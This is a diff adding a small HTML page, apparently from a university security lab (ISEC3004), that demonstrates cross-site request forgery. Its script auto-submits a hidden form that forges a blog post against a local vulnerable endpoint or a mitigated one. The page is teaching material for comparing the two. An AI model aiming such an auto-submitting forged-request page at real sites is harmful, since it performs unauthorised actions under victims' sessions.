@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Demo</title>
+</head>
+<body>
+  <p>Running Demo...</p>
+  <form id="attack" method="post">
+    <input
+      type="hidden"
+      name="description"
+      value="Unauthorised post created via CSRF"
+    >
+  </form>
+  <script>
+    const mitigated = new URLSearchParams(location.search).get('target') === 'mitigated';
+    document.getElementById('attack').action = 'http://127.0.0.1/ISEC3004/' + (mitigated ? 'blogadd-mitigation.php' : 'blogadd.php');
+    document.getElementById('attack').submit();
+  </script>
+</body>
